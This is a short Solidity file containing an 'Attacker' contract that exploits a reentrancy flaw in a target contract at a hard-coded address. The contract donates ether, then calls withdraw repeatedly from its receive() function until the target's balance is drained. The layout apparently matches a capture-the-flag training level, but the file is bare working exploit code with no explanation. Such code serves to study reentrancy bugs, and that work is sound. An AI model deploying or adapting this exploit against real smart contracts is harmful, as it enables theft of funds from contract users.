// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IReentrance {
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
}
contract Attacker {
    address target = 0xDcc22fEE93DE42bcA545B85aF205EeAF8BfF1aC6;
    IReentrance targetContract = IReentrance(target);

    function attack() public payable {
        targetContract.donate{ value: msg.value }(address(this));
        targetContract.withdraw(msg.value);
    }
    receive() external payable {
        if (target.balance < targetContract.balanceOf(address(this)))
            targetContract.withdraw(target.balance);
        else
            targetContract.withdraw(targetContract.balanceOf(address(this)));
    }
}
